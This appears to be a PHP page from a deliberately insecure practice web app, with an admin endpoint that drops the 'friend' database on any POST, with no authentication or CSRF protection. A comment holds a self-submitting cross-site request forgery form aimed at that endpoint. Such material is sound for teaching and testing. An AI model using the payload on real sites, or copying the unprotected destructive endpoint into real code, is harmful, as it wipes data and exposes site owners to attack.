<html>
<head>
</head>
<body>

    <form method="post">
        <button type="submit" name="delete">Delete Database</button>
    </form>

</body>
</html>

<!--
<html>
    <body>
        <form action="http://localhost/insecureweb/admin/resetDB.php" method="POST">
            <input type="hidden" name="delete" value="" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
-->

<?php

if (isset($_POST['delete'])) {
    include '../config/database.php';
	
	$sql = "DROP DATABASE `friend`";
	$result = $conn->query($sql);
	
	echo "Database 'friend' dropped successfully!";
	
}

?>